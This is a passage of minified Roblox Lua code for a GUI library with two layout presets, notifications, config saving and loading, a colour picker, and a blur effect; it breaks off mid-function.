do Library={Open=true,Accent=Color3.fromRGB(255,188,254),TabAnimSpeed=0.30,Tabs={},Sections={},Flags={},UnNamedFlags=0,ThemeObjects={},Blurframe=nil,Holder=nil,CurrentLayout="CSGO",Notificationsframe=nil,Layouts={CSGO={MainFrame={Size=UDim2.fromOffset(500,350)},TabBackground={Position=UDim2.fromOffset(0,85),Size=UDim2.new(1,0,1,-97)},Tabs={Position=UDim2.fromOffset(8,42),Size=UDim2.new(1,-18,0,30),Direction=Enum.FillDirection.Horizontal},TabsScrolling={Padding={PaddingTop=UDim.new(0,1),PaddingLeft=UDim.new(0,0)}},Holders={Textbox=UDim2.new(1,-174,0,23),Keybind=UDim2.new(1,-225,0,23),Dropdown=UDim2.new(1,-154,0,23)}},Kavo={MainFrame={Size=UDim2.fromOffset(605,371)},TabBackground={Position=UDim2.fromOffset(176,27),Size=UDim2.new(1,-184,1,-50)},Tabs={Position=UDim2.fromOffset(12,44),Size=UDim2.new(0,160,1,-12),Direction=Enum.FillDirection.Vertical},TabsScrolling={Padding={PaddingTop=UDim.new(0,17),PaddingLeft=UDim.new(0,4)}},Holders={Textbox=UDim2.new(1,-320,0,23),Keybind=UDim2.new(1,-377,0,23),Dropdown=UDim2.new(1,-280,0,23)}}},Keys={[Enum.KeyCode.LeftShift]="LShift",[Enum.KeyCode.RightShift]="RShift",[Enum.KeyCode.LeftControl]="LCtrl",[Enum.KeyCode.RightControl]="RCtrl",[Enum.KeyCode.LeftAlt]="LAlt",[Enum.KeyCode.RightAlt]="RAlt",[Enum.KeyCode.CapsLock]="Caps",[Enum.KeyCode.One]="1",[Enum.KeyCode.Two]="2",[Enum.KeyCode.Three]="3",[Enum.KeyCode.Four]="4",[Enum.KeyCode.Five]="5",[Enum.KeyCode.Six]="6",[Enum.KeyCode.Seven]="7",[Enum.KeyCode.Eight]="8",[Enum.KeyCode.Nine]="9",[Enum.KeyCode.Zero]="0",[Enum.KeyCode.KeypadOne]="Num1",[Enum.KeyCode.KeypadTwo]="Num2",[Enum.KeyCode.KeypadThree]="Num3",[Enum.KeyCode.KeypadFour]="Num4",[Enum.KeyCode.KeypadFive]="Num5",[Enum.KeyCode.KeypadSix]="Num6",[Enum.KeyCode.KeypadSeven]="Num7",[Enum.KeyCode.KeypadEight]="Num8",[Enum.KeyCode.KeypadNine]="Num9",[Enum.KeyCode.KeypadZero]="Num0",[Enum.KeyCode.Minus]="-",[Enum.KeyCode.Equals]="=",[Enum.KeyCode.Tilde]="~",[Enum.KeyCode.LeftBracket]="[",[Enum.KeyCode.RightBracket]="]",[Enum.KeyCode.RightParenthesis]=")",[Enum.KeyCode.LeftParenthesis]="(",[Enum.KeyCode.Semicolon]=",",[Enum.KeyCode.Quote]="'",[Enum.KeyCode.BackSlash]="\\",[Enum.KeyCode.Comma]=",",[Enum.KeyCode.Period]=".",[Enum.KeyCode.Slash]="/",[Enum.KeyCode.Asterisk]="*",[Enum.KeyCode.Plus]="+",[Enum.KeyCode.Period]=".",[Enum.KeyCode.Backquote]="`",[Enum.UserInputType.MouseButton1]="MB1",[Enum.UserInputType.MouseButton2]="MB2",[Enum.UserInputType.MouseButton3]="MB3"},Connections={},UIKey=Enum.KeyCode.End,ScreenGUI=nil,FSize=13,UIFont=Font.new"rbxasset://fonts/families/Ubuntu.json",SettingsTab=nil,VisValues={},Cooldown=false,KeybindList={Keybinds={},Frame=nil,Visible=false}}local a=game:GetService"TweenService"function Library.SetLayout(b,c)if b.Layouts[c]then b.CurrentLayout=c;local d=b.Layouts[c]if b.Holder then a:Create(b.Holder,TweenInfo.new(0.3,Enum.EasingStyle.Sine),{Size=d.MainFrame.Size}):Play()end;local e=b.Holder:FindFirstChild"tabs_minimized"if e then local f=c=="CSGO"and UDim2.fromOffset(8,42)or UDim2.fromOffset(12,44)local g=c=="CSGO"and UDim2.new(1,-18,0,30)or UDim2.new(0,160,1,-12)a:Create(e,TweenInfo.new(0.3,Enum.EasingStyle.Sine),{Position=f,Size=g}):Play()local h=e:FindFirstChild"Frame"if h and h:IsA"ScrollingFrame"then h.ScrollingDirection=c=="CSGO"and Enum.ScrollingDirection.X or Enum.ScrollingDirection.Y;local i=h:FindFirstChild"UIListLayout"if i then i.FillDirection=d.Tabs.Direction;for j,k in pairs(h:GetChildren())do if k:IsA"TextButton"then a:Create(k,TweenInfo.new(0.3,Enum.EasingStyle.Sine),{Size=c=="CSGO"and UDim2.new(0,82,1,0)or UDim2.new(1,0,0,30)}):Play()local l=k:FindFirstChild"TextLabel"if l then l.TextXAlignment=c=="CSGO"and Enum.TextXAlignment.Center or Enum.TextXAlignment.Left;local m=l:FindFirstChild"UIPadding"if m then m.PaddingLeft=c=="CSGO"and UDim.new(0,0)or UDim.new(0,20)end end;local m=k:FindFirstChild"TabIndicator"if m then local n=c=="CSGO"and UDim2.new(0.22,5,1.07,-4)or UDim2.new(0,8,0,7)local o=c=="CSGO"and UDim2.fromOffset(35,4)or UDim2.fromOffset(2,16)a:Create(m,TweenInfo.new(0.3,Enum.EasingStyle.Sine),{Position=n,Size=o}):Play()end end end;h.CanvasSize=c=="CSGO"and UDim2.new(1,15,0,0)or UDim2.new(0,0,1,15)end end end;if e then local f=e:FindFirstChild"Frame"if f then for g,h in pairs(f:GetChildren())do if h:IsA"TextButton"then local i;for j,k in pairs(b.Tabs)do if k.Name==h.Name then i=k;break end end;local j=c=="Kavo"and(i and i.Open and 0.91 or 0.97)or 0.91;a:Create(h,TweenInfo.new(0.3,Enum.EasingStyle.Sine),{BackgroundTransparency=j}):Play()end end end end;local f=b.Holder:FindFirstChild"tab background"if f then local g=c=="CSGO"and UDim2.fromOffset(0,85)or UDim2.fromOffset(176,43)a:Create(f,TweenInfo.new(0.3,Enum.EasingStyle.Sine),{Position=g,Size=d.TabBackground.Size}):Play()local function p(h)for i,j in pairs(h:GetChildren())do if j.Name=="content"then local k=j:FindFirstChild"_"if k and k:IsA"UIListLayout"then k.FillDirection=c=="CSGO"and Enum.FillDirection.Horizontal or Enum.FillDirection.Vertical;k.HorizontalFlex=c=="Kavo"and 1 or 0 end end;if j.Name=="DropdownHolder"then a:Create(j,TweenInfo.new(0.3,Enum.EasingStyle.Sine),{Size=d.Holders.Dropdown}):Play()elseif j.Name=="KeybindHolder"then a:Create(j,TweenInfo.new(0.3,Enum.EasingStyle.Sine),{Size=d.Holders.Keybind}):Play()elseif j.Name=="TextboxHolder"then a:Create(j,TweenInfo.new(0.3,Enum.EasingStyle.Sine),{Size=d.Holders.Textbox}):Play()end;if#j:GetChildren()>0 then p(j)end end end;p(f)end end end;local b=game:GetService"RunService":IsStudio()and game:GetService"Players".LocalPlayer:WaitForChild"PlayerGui"or game:GetService"CoreGui"do function Library.Connection(c,d,e)local f=d:Connect(e)return f end end;local c={Notifs={},ScreenGui=Instance.new"ScreenGui",NotificationsFrame=nil}function c.Init(d)d.ScreenGui.Name="NotificationGui"d.ScreenGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;d.ScreenGui.Parent=b;d.NotificationsFrame=Instance.new"Frame"d.NotificationsFrame.Name="Notifications"d.NotificationsFrame.AnchorPoint=Vector2.new(1,1)d.NotificationsFrame.BackgroundTransparency=1;d.NotificationsFrame.Position=UDim2.new(1,-20,1,-20)d.NotificationsFrame.Size=UDim2.fromOffset(300,800)d.NotificationsFrame.Parent=d.ScreenGui;c.NotificationsFrame=d.NotificationsFrame;local e=Instance.new"UIListLayout"e.Padding=UDim.new(0,8)e.HorizontalAlignment=Enum.HorizontalAlignment.Right;e.SortOrder=Enum.SortOrder.LayoutOrder;e.VerticalAlignment=Enum.VerticalAlignment.Bottom;e.Parent=d.NotificationsFrame end;function c.CreateNotification(d,e,f,g,h)local i=Instance.new"Frame"i.Name="Notification"i.AnchorPoint=Vector2.new(1,1)i.BackgroundTransparency=0.06;i.AutomaticSize=Enum.AutomaticSize.XY;i.BackgroundColor3=Color3.fromRGB(16,16,16)i.BorderSizePixel=0;i.Position=UDim2.new(1,-25,1,-25)i.Size=UDim2.fromOffset(232,59)local j=Instance.new("UIStroke",i)j.Name="_CHILD"j.Color=Color3.fromRGB(158,114,158)j.Transparency=0.9;local k=Instance.new"ImageLabel"k.Name="acrylicthing"k.Image="rbxassetid://9968344105"k.ImageTransparency=0.98;k.ScaleType=Enum.ScaleType.Tile;k.TileSize=UDim2.fromOffset(128,128)k.BackgroundColor3=Color3.fromRGB(255,255,255)k.BackgroundTransparency=1;k.BorderColor3=Color3.fromRGB(0,0,0)k.BorderSizePixel=0;k.Size=UDim2.fromScale(1,1)local l=Instance.new"UICorner"l.Name="UICorner"l.CornerRadius=UDim.new(0,12)l.Parent=k;k.Parent=i;local m=Instance.new"ImageLabel"m.Name="acrylicthing"m.Image="rbxassetid://9968344227"m.ImageTransparency=0.9;m.ScaleType=Enum.ScaleType.Tile;m.TileSize=UDim2.fromOffset(128,128)m.BackgroundColor3=Color3.fromRGB(255,255,255)m.BackgroundTransparency=1;m.BorderColor3=Color3.fromRGB(0,0,0)m.BorderSizePixel=0;m.Size=UDim2.fromScale(1,1)local n=Instance.new"UICorner"n.Name="UICorner"n.CornerRadius=UDim.new(0,12)n.Parent=m;m.Parent=i;local o=Instance.new"Frame"o.Name="TextHolder"o.AutomaticSize=Enum.AutomaticSize.XY;o.BackgroundTransparency=1;o.Position=UDim2.new(0,7,0.12,0)o.Size=UDim2.fromOffset(20,12)local q=Instance.new"UIListLayout"q.Padding=UDim.new(0,-4)q.SortOrder=Enum.SortOrder.LayoutOrder;q.Parent=o;local r=Instance.new"TextLabel"r.FontFace=Font.new("rbxassetid://12187365364",Enum.FontWeight.SemiBold)r.Text=e;r.TextColor3=Color3.fromRGB(199,199,203)r.TextSize=14;r.TextXAlignment=Enum.TextXAlignment.Left;r.AutomaticSize=Enum.AutomaticSize.X;r.BackgroundTransparency=1;r.Position=UDim2.fromOffset(10,8)r.Size=UDim2.fromOffset(212,20)r.Parent=o;local s=Instance.new("TextLabel",o)s.Name="TextLabel"s.FontFace=Font.new("rbxassetid://12187365364",Enum.FontWeight.SemiBold,Enum.FontStyle.Normal)s.Text=f;s.TextColor3=Color3.fromRGB(127,127,130)s.TextSize=12;s.TextXAlignment=Enum.TextXAlignment.Left;s.AutomaticSize=Enum.AutomaticSize.X;s.BackgroundTransparency=1;s.Position=UDim2.fromOffset(10,8)s.Size=UDim2.fromOffset(212,20)local t=Instance.new"UIPadding"t.PaddingBottom=UDim.new(0,25)t.Parent=o;o.Parent=i;local u=Instance.new"Frame"u.BackgroundColor3=Color3.fromRGB(44,38,44)u.BorderSizePixel=0;u.Position=UDim2.fromScale(0.0282,0.8)u.Size=UDim2.new(1,-20,0,7)local v=Instance.new("UIListLayout",u)v.Name="UIListLayout"v.Wraps=true;v.FillDirection=Enum.FillDirection.Horizontal;v.SortOrder=Enum.SortOrder.LayoutOrder;v.VerticalAlignment=Enum.VerticalAlignment.Bottom;local w=Instance.new"Frame"w.BackgroundColor3=h or Color3.fromRGB(255,188,254)w.BorderSizePixel=0;w.Size=UDim2.fromScale(1,1)local x=Instance.new"UICorner"x.Parent=w;local y=Instance.new"UIGradient"y.Color=ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(0.752,Color3.fromRGB(147,147,147)),ColorSequenceKeypoint.new(1,Color3.fromRGB(127,127,127))}y.Parent=w;w.Parent=u;local z=Instance.new"UICorner"z.Parent=u;u.Parent=i;local A=Instance.new"UICorner"A.CornerRadius=UDim.new(0,4)A.Parent=i;local B=Instance.new"UIPadding"B.PaddingBottom=UDim.new(0,12)B.Parent=i;i.Parent=d.NotificationsFrame;game:GetService"TweenService":Create(w,TweenInfo.new(g,Enum.EasingStyle.Linear),{Size=UDim2.new(0,0,1,0)}):Play()local C={Frame=i,StartTime=tick()}table.insert(d.Notifs,C)d:UpdatePositions()task.delay(g,function()d:RemoveNotification(C)end)local D=Instance.new"TextButton"D.Name="DismissButton"D.BackgroundColor3=Color3.fromRGB(0,0,0)D.BackgroundTransparency=1;D.Size=UDim2.fromScale(1,1)D.Text=""D.Parent=i;D.MouseEnter:Connect(function()game:GetService"TweenService":Create(D,TweenInfo.new(0.1),{BackgroundTransparency=0.65}):Play()end)D.MouseLeave:Connect(function()game:GetService"TweenService":Create(D,TweenInfo.new(0.1),{BackgroundTransparency=1}):Play()end)D.MouseButton1Click:Connect(function()d:RemoveNotification(C)end)return C end;function c.UpdatePositions(d)local e=10;local f=-25;for g,h in ipairs(d.Notifs)do local i=f-(g-1)*(h.Frame.AbsoluteSize.Y+e)game:GetService"TweenService":Create(h.Frame,TweenInfo.new(0.1),{Position=UDim2.new(1,-25,1,i)}):Play()end end;function c.RemoveNotification(d,e)local f=table.find(d.Notifs,e)if f then table.remove(d.Notifs,f)game:GetService"TweenService":Create(e.Frame,TweenInfo.new(0.1),{BackgroundTransparency=1}):Play()task.wait(0.1)e.Frame:Destroy()d:UpdatePositions()end end;c:Init()Library.Notificationsframe=c.NotificationsFrame;print(c.NotificationsFrame)print(Library.Notificationsframe)function Library.Notify(d,e)return c:CreateNotification(e.Title,e.Content,e.Duration,e.Color)end;c:Init()local d={}local e=game:GetService"Players"local f=e.LocalPlayer;Library.__index=Library;Library.Tabs.__index=Library.Tabs;Library.Sections.__index=Library.Sections;local g=game:GetService"Players".LocalPlayer;local h=g:GetMouse()do function Library.Connection(i,j,k)local l=j:Connect(k)return l end;function Library.Disconnect(i,j)j:Disconnect()end;function Library.Round(i,j,k)return k*math.floor(j/k)end;function Library.NextFlag()Library.UnNamedFlags=Library.UnNamedFlags+1;return string.format("%.14g",Library.UnNamedFlags)end;function Library.RGBA(i,j,k,l,m)j=math.floor(j)k=math.floor(k)l=math.floor(l)return j..", "..k..", "..l end;function Library.GetConfig(i)local j=""for k,l in pairs(i.Flags)do if k~="ConfigConfig_List"and k~="ConfigConfig_Load"and k~="ConfigConfig_Save"then local m=l;local n=""if typeof(m)=="Color3"then local o,r,s=m:ToHSV()n=("rgb(%s,%s,%s,%s)"):format(tostring(o),tostring(r),tostring(s),"1")elseif typeof(m)=="table"and m.Color and m.Transparency then local o,r,s=m.Color:ToHSV()n=("rgb(%s,%s,%s,%s)"):format(o,r,s,m.Transparency)elseif typeof(m)=="table"and l.Mode then local o=l.current;n=("key(%s,%s,%s)"):format(o[1]or"nil",o[2]or"nil",l.Mode)elseif m~=nil then if typeof(m)=="boolean"then m=("bool(%s)"):format(tostring(m))elseif typeof(m)=="table"then local o="table("for r,s in pairs(m)do o=o..s..","end;if o:sub(#o)==","then o=o:sub(0,#o-1)end;m=o..")"elseif typeof(m)=="string"then m=("string(%s)"):format(m)elseif typeof(m)=="number"then m=("number(%s)"):format(tostring(m))end;n=m end;j=j..k..": "..tostring(n).."\n"end end;return j end;function Library.LoadConfig(i,j)local k=string.split(j,"\n")local l={}for m,n in pairs(k)do local o=string.split(n,":")if o[1]~="ConfigConfig_List"and#o>=2 then local r=o[2]:sub(2,#o[2])if r:sub(1,3)=="rgb"then local s=string.split(r:sub(5,#r-1),",")r=s elseif r:sub(1,3)=="key"then local s=string.split(r:sub(5,#r-1),",")if s[1]=="nil"and s[2]=="nil"then s[1]=nil;s[2]=nil end;r=s elseif r:sub(1,4)=="bool"then local s=r:sub(6,#r-1)r=s=="true"elseif r:sub(1,5)=="table"then local s=string.split(r:sub(7,#r-1),",")r=s elseif r:sub(1,6)=="string"then local s=r:sub(8,#r-1)r=s elseif r:sub(1,6)=="number"then local s=tonumber(r:sub(8,#r-1))r=s end;l[o[1]]=r end end;for m,n in pairs(l)do if d[m]then if typeof(d[m])=="table"then d[m]:Set(n)else d[m](n)end end end end;function Library.AutoLoadConfig(i)pcall(function()if isfile"default.cfg"then local j=readfile"default.cfg"i:LoadConfig(j)end end)end;function Library.IsMouseOverFrame(i,j)local k=game:GetService"UserInputService"local l,m=j.AbsolutePosition,j.AbsoluteSize;local n,o;if k.TouchEnabled then local r=k:GetTouchPosition()if r then n,o=r.X,r.Y else return false end else n,o=h.X,h.Y end;if n>=l.X and n<=l.X+m.X and o>=l.Y and o<=l.Y+m.Y then return true end;return false end;function Library.ChangeAccent(i,j)Library.Accent=j;for k,l in next,Library.ThemeObjects do if l:IsA"Frame"or l:IsA"TextButton"or l:IsA"ScrollingFrame"then l.BackgroundColor3=j elseif l:IsA"TextLabel"or l:IsA"TextBox"then l.TextColor3=j elseif l:IsA"ImageLabel"or l:IsA"ImageButton"then l.ImageColor3=j end end end end;local i=game:GetService"Players"local j=i.LocalPlayer;local k=Library.Tabs;local l=Library.Sections;local function E(m,n)local o;local r;local s;local t;local function F(u)local v=u.Position-s;local w=UDim2.new(t.X.Scale,t.X.Offset+v.X,t.Y.Scale,t.Y.Offset+v.Y)n.Position=w end;m.InputBegan:Connect(function(u)if u.UserInputType==Enum.UserInputType.MouseButton1 or u.UserInputType==Enum.UserInputType.Touch then o=true;s=u.Position;t=n.Position;u.Changed:Connect(function()if u.UserInputState==Enum.UserInputState.End then o=false end end)end end)m.InputChanged:Connect(function(u)if u.UserInputType==Enum.UserInputType.MouseMovement or u.UserInputType==Enum.UserInputType.Touch then r=u end end)game:GetService"UserInputService".InputChanged:Connect(function(u)if u==r and o then F(u)end end)end;function Library.Window(m,n)local o={Tabs={},Sections={},Elements={},Dragging={false,UDim2.new(0,0,0,0)},Name=n.Name or"bluey ui"}local r=Instance.new"ScreenGui"r.Name=o.Name;r.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;r.Parent=b;local s=Instance.new("Frame",r)s.Name="second dcsgo"s.BackgroundColor3=Color3.fromRGB(16,16,16)s.BackgroundTransparency=0.06;s.Visible=false;s.BorderColor3=Color3.fromRGB(0,0,0)s.BorderSizePixel=0;s.Position=UDim2.fromScale(0.208,0.268)local t=m.Layouts[m.CurrentLayout]s.Size=t.MainFrame.Size;function Library.NewPicker(u,v,w,x,y,z,A,B)local C=Instance.new"TextButton"C.Name="KeybindHolder1"C.Text=""C.Active=false;C.BackgroundColor3=w;C.BorderColor3=Color3.fromRGB(0,0,0)C.BorderSizePixel=0;C.Selectable=false;C.Size=UDim2.fromScale(1,1)C.ZIndex=4;local D=Instance.new("UIStroke",C)D.Name="UIStroke"D.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;D.Color=Color3.fromRGB(255,255,255)D.Thickness=2;D.Transparency=0.95;local G=Instance.new"UICorner"G.Name="UICorner"G.CornerRadius=UDim.new(0,5)G.Parent=C;C.Parent=y;local H=Instance.new("Frame",s)H.AnchorPoint=Vector2.new(1,0)H.Name="Colorpicker"H.BackgroundColor3=Color3.fromRGB(16,16,16)H.BackgroundTransparency=0.06;H.BorderColor3=Color3.fromRGB(0,0,0)H.BorderSizePixel=0;H.Position=UDim2.new(1,185,0,0)H.Size=UDim2.fromOffset(180,200)H.ZIndex=100;local I=Instance.new"UIScale"I.Scale=0;I.Parent=H;local J=Instance.new"ImageButton"J.Name="ImageButton"J.Image="rbxassetid://14684562507"J.AutoButtonColor=false;J.BackgroundColor3=Color3.fromRGB(255,188,254)J.BorderColor3=Color3.fromRGB(0,0,0)J.BorderSizePixel=0;J.Position=UDim2.fromScale(0.0504,0.061)J.Size=UDim2.fromOffset(160,154)J.ZIndex=85;local K=Instance.new"ImageLabel"K.Name="Val"K.Image="http://www.roblox.com/asset/?id=14684563800"K.BackgroundColor3=Color3.fromRGB(255,255,255)K.BackgroundTransparency=1;K.BorderColor3=Color3.fromRGB(0,0,0)K.BorderSizePixel=0;K.Size=UDim2.fromScale(1,1)K.Parent=J;local L=Instance.new"Frame"L.Name="SV_slider"L.BackgroundColor3=Color3.fromRGB(255,255,255)L.BackgroundTransparency=1;L.ClipsDescendants=true;L.Size=UDim2.fromScale(0.0419,0.047)L.ZIndex=3;local M=Instance.new"UICorner"M.Name="UICorner"M.CornerRadius=UDim.new(0,100)M.Parent=L;local N=Instance.new"UIStroke"N.Name="UIStroke"N.Color=Color3.fromRGB(255,255,255)N.Parent=L;L.Parent=J;J.Parent=H;local O=Instance.new"ImageButton"O.Name="ImageButton1"O.Image="http://www.roblox.com/asset/?id=16789872274"O.AutoButtonColor=false;O.BackgroundColor3=Color3.fromRGB(255,255,255)O.BorderColor3=Color3.fromRGB(0,0,0)O.BorderSizePixel=0;O.Position=UDim2.new(0.066,0,0.035,168)O.Size=UDim2.fromOffset(154,13)local P=Instance.new"Frame"P.Name="Frame"P.BackgroundColor3=Color3.fromRGB(254,254,254)P.BorderColor3=Color3.fromRGB(0,0,0)P.BorderSizePixel=0;P.Position=UDim2.fromScale(0.982,-0.16)P.Size=UDim2.fromOffset(5,17)P.ZIndex=45;local Q=Instance.new"UICorner"Q.Name="UICorner"Q.Parent=P;P.Parent=O;O.Parent=H;local R=Instance.new"ImageLabel"R.Name="acrylicthing"R.Image="rbxassetid://9968344105"R.ImageTransparency=0.98;R.ScaleType=Enum.ScaleType.Tile;R.TileSize=UDim2.fromOffset(128,128)R.BackgroundColor3=Color3.fromRGB(255,255,255)R.BackgroundTransparency=1;R.BorderColor3=Color3.fromRGB(0,0,0)R.BorderSizePixel=0;R.Size=UDim2.fromScale(1,1)local S=Instance.new"UICorner"S.Name="UICorner"S.CornerRadius=UDim.new(0,12)S.Parent=R;R.Parent=H;local T=Instance.new"ImageLabel"T.Name="acrylicthing"T.Image="rbxassetid://9968344227"T.ImageTransparency=0.9;T.ScaleType=Enum.ScaleType.Tile;T.TileSize=UDim2.fromOffset(128,128)T.BackgroundColor3=Color3.fromRGB(255,255,255)T.BackgroundTransparency=1;T.BorderColor3=Color3.fromRGB(0,0,0)T.BorderSizePixel=0;T.Size=UDim2.fromScale(1,1)local U=Instance.new"UICorner"U.Name="UICorner"U.CornerRadius=UDim.new(0,12)U.Parent=T;T.Parent=H;local V=Instance.new"UIStroke"V.Name="_CHILD"V.Color=Color3.fromRGB(158,114,158)V.Transparency=0.9;V.Parent=H;local W=Instance.new"UICorner"W.Name="UICorner"W.Parent=H;local X=Instance.new"Frame"X.Name="sideindicator"X.AnchorPoint=Vector2.new(0.5,0)X.BackgroundColor3=Color3.fromRGB(255,188,254)X.BorderColor3=Color3.fromRGB(0,0,0)X.BorderSizePixel=0;X.Position=UDim2.fromScale(0.5,0)X.Size=UDim2.new(1,-50,0,2)local Y=Instance.new"UICorner"Y.Name="UICorner"Y.CornerRadius=UDim.new(0,634)Y.Parent=X;X.Parent=H;local Z,_,a0=w:ToHSV()local a1=w:ToHSV()local a2=x;local a3=false;local a4=false;local a5=false;local function a6()local a7=game:GetService"UserInputService":GetMouseLocation()local a8=Vector2.new(a7.X,a7.Y-30)local a9=a8-J.AbsolutePosition;local aa=a8-O.AbsolutePosition;if a3 then _=math.clamp(1-a9.X/J.AbsoluteSize.X,0,1)a0=math.clamp(1-a9.Y/J.AbsoluteSize.Y,0,1)elseif a4 then Z=math.clamp(aa.X/J.AbsoluteSize.X,0,1)end;a1=Color3.fromHSV(Z,_,a0)a:Create(L,TweenInfo.new(0.05,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Position=UDim2.new(math.clamp(1-_,0.000,0.945),0,math.clamp(1-a0,0.000,0.955),0)}):Play()J.BackgroundColor3=Color3.fromHSV(Z,1,1)C.BackgroundColor3=a1;a:Create(P,TweenInfo.new(0.05,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Position=UDim2.new(math.clamp(Z,0.000,0.982),0,-0.16,0)}):Play()a1=Color3.fromHSV(Z,_,a0)local ab=math.floor(a1.R*255)local ac=math.floor(a1.G*255)local ad=math.floor(a1.B*255)if A then Library.Flags[A]=ab..", "..ac..", "..ad end;B(Library:RGBA(ab,ac,ad))end;local function ae(a7,a8)if type(a7)=="table"then a8=a7[4]a7=Color3.fromHSV(a7[1],a7[2],a7[3])end;if type(a7)=="string"then a7=Color3.fromHex(a7)end;local a9=a1;Z,_,a0=a7:ToHSV()a2=a8 or 1;a1=Color3.fromHSV(Z,_,a0)if a1~=a9 then C.BackgroundColor3=a1;a:Create(L,TweenInfo.new(0.05,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Position=UDim2.new(math.clamp(1-_,0.000,0.945),0,math.clamp(1-a0,0.000,0.955),0)}):Play()J.BackgroundColor3=Color3.fromHSV(Z,1,1)a:Create(P,TweenInfo.new(0.05,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Position=UDim2.new(math.clamp(Z,0.000,0.982),0,-0.16,0)}):Play()a1=Color3.fromHSV(Z,_,a0)local aa=math.floor(a1.R*255)local ab=math.floor(a1.G*255)local ac=math.floor(a1.B*255)if A then Library.Flags[A]=Library:RGBA(aa,ab,ac)end;B(Library:RGBA(aa,ab,ac))end end;d[A]=ae;ae(w,x)J.InputBegan:Connect(function(a7)if a7.UserInputType==Enum.UserInputType.MouseButton1 or a7.UserInputType==Enum.UserInputType.Touch then a3=true;a6()end end)J.InputEnded:Connect(function(a7)if a7.UserInputType==Enum.UserInputType.MouseButton1 or a7.UserInputType==Enum.UserInputType.Touch then a3=false;a6()end end)O.InputBegan:Connect(function(a7)if a7.UserInputType==Enum.UserInputType.MouseButton1 or a7.UserInputType==Enum.UserInputType.Touch then a4=true;a6()end end)O.InputEnded:Connect(function(a7)if a7.UserInputType==Enum.UserInputType.MouseButton1 or a7.UserInputType==Enum.UserInputType.Touch then a4=false;a6()end end)Library:Connection(game:GetService"UserInputService".InputChanged,function(a7)if a7.UserInputType==Enum.UserInputType.MouseMovement or a7.UserInputType==Enum.UserInputType.Touch then if a5 then a6()end;if a4 then a6()end;if a3 then a6()end end end)local a7={}function a7.Set(a8,a9,aa)ae(a9,aa)end;Library:Connection(game:GetService"UserInputService".InputBegan,function(a8)if H.Visible and(a8.UserInputType==Enum.UserInputType.MouseButton1 or a8.UserInputType==Enum.UserInputType.Touch)then if not Library:IsMouseOverFrame(H)and not Library:IsMouseOverFrame(C)then a:Create(I,TweenInfo.new(0.08,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Scale=0}):Play()end end end)Library:Connection(C.InputBegan,function(a8)if a8.UserInputType==Enum.UserInputType.MouseButton1 or a8.UserInputType==Enum.UserInputType.Touch then a:Create(I,TweenInfo.new(0.08,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Scale=1}):Play()if a4 then a4=false end;if a3 then a3=false end;if a5 then a5=false end end end)return a7,H end;local a3=Instance.new"Frame"a3.Size=UDim2.new(0.95,0,0.95,0)a3.Position=UDim2.new(0.5,0,0.5,0)a3.AnchorPoint=Vector2.new(0.5,0.5)a3.BackgroundTransparency=1;Library.BlurTemplate=a3;local a4=game:GetService"RunService"local a5=workspace.CurrentCamera;local a7="Glass"local a8={}local a9=Instance.new("Folder",a5)a9.Name="BlurSnox"local aa=99999999;local ab=math.random(1,aa)local ac=Instance.new("DepthOfFieldEffect",game:GetService"Lighting")ac.FarIntensity=0;Library.Blurframe=ac;ac.FocusDistance=51.6;ac.InFocusRadius=50;ac.NearIntensity=1;ac.Name="DPT_"..ab;local ad=Library.BlurTemplate:Clone()ad.Parent=s;local u;do local v=0;function u()v=v+1;return"neon::"..tostring(v)end end;do local function af(v)return v==v end;local v=af(a5:ScreenPointToRay(0,0).Origin.x)while not v do a4.RenderStepped:wait()v=af(a5:ScreenPointToRay(0,0).Origin.x)end end;local v;local w,x,y,z=math.acos,math.max,math.pi,math.sqrt;local A=0.2;function DrawTriangle(B,C,G,H,I)local J=(B-C).magnitude;local L=(C-G).magnitude;local M=(G-B).magnitude;local N=x(J,L,M)local O,P,Q;if J==N then O,P,Q=B,C,G elseif L==N then O,P,Q=C,G,B elseif M==N then O,P,Q=G,B,C end;local R=((P-O).x*(Q-O).x+(P-O).y*(Q-O).y+(P-O).z*(Q-O).z)/(O-P).magnitude;local S=z((Q-O).magnitude^2-R*R)local T=(O-P).magnitude-R;local U=CFrame.new(P,O)local V=CFrame.Angles(y/2,0,0)local W=U;local X=(W*V).lookVector;local Y=O+CFrame.new(O,P).LookVector*R;local Z=CFrame.new(Y,Q).LookVector;local _=X.x*Z.x+X.y*Z.y+X.z*Z.z;local a0=CFrame.Angles(0,0,w(_))W=W*a0;if((W*V).lookVector-Z).magnitude>0.01 then W=W*CFrame.Angles(0,0,-2*w(_))end;W=W*CFrame.new(0,S/2,-(T+R/2))local a1=U*a0*CFrame.Angles(0,y,0)if((a1*V).lookVector-Z).magnitude>0.01 then a1=a1*CFrame.Angles(0,0,2*w(_))end;a1=a1*CFrame.new(0,S/2,T/2)if not H then H=Instance.new"Part"H.FormFactor="Custom"H.TopSurface=0;H.BottomSurface=0;H.Anchored=true;H.CanCollide=false;H.CastShadow=false;H.Material=a7;H.Size=Vector3.new(A,A,A)local a2=Instance.new("SpecialMesh",H)a2.MeshType=2;a2.Name="WedgeMesh"end;H.WedgeMesh.Scale=Vector3.new(0,S/A,R/A)H.CFrame=W;if not I then I=H:clone()end;I.WedgeMesh.Scale=Vector3.new(0,S/A,T/A)I.CFrame=a1;return H,I end;function v(B,C,G,H,I)I[1],I[2]=DrawTriangle(B,C,G,I[1],I[2])I[3],I[4]=DrawTriangle(G,C,H,I[3],I[4])end;if a8[ad]then return a8[ad].parts end;local B={}local C=Instance.new("Folder",a9)C.Name=ad.Name;local G={}local function ag(H)if H:IsA"GuiObject"then G[#G+1]=H;ag(H.Parent)end end;local function ah(H)local I={Transparency=0.98,BrickColor=BrickColor.new"Institutional white"}local J=1-0.05*ad.ZIndex;local L,M=ad.AbsolutePosition,ad.AbsolutePosition+ad.AbsoluteSize;local N,O=Vector2.new(M.x,L.y),Vector2.new(L.x,M.y)do local P=0;for Q,R in ipairs(G)do P=P+R.Rotation end;if P~=0 and P%180~=0 then local Q=L:lerp(M,0.5)local 